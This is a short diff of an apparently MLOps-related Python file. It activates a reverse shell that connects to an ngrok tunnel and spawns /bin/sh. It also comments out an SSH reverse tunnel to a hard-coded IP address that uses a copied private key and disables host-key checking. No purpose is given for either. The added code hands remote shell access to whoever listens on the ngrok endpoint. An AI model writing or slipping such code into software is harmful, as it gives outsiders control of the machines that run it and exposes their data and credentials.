@@ -106,16 +106,18 @@
 
 # -------------------------
 
-# import socket,os,pty
-# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-# s.connect(("0.tcp.eu.ngrok.io",13950))
-# os.dup2(s.fileno(),0)
-# os.dup2(s.fileno(),1)
-# os.dup2(s.fileno(),2)
-# pty.spawn("/bin/sh")
- 
-import os
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("0.tcp.eu.ngrok.io",17262))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/sh")
 
-os.system("cp mlops_tunnel.pem /tmp/mlops_tunnel.pem")
-os.system("chmod 600 /tmp/mlops_tunnel.pem")
-os.system("ssh -i /tmp/mlops_tunnel.pem -N -R 7010:127.0.0.1:23 -o StrictHostKeyChecking=no -vvv tunnel@4.231.121.209")
+# ---------------------------
+ 
+# import os
+
+# os.system("cp mlops_tunnel.pem /tmp/mlops_tunnel.pem")
+# os.system("chmod 600 /tmp/mlops_tunnel.pem")
+# os.system("ssh -i /tmp/mlops_tunnel.pem -N -R 7010:127.0.0.1:23 -o StrictHostKeyChecking=no -vvv tunnel@4.231.121.209")
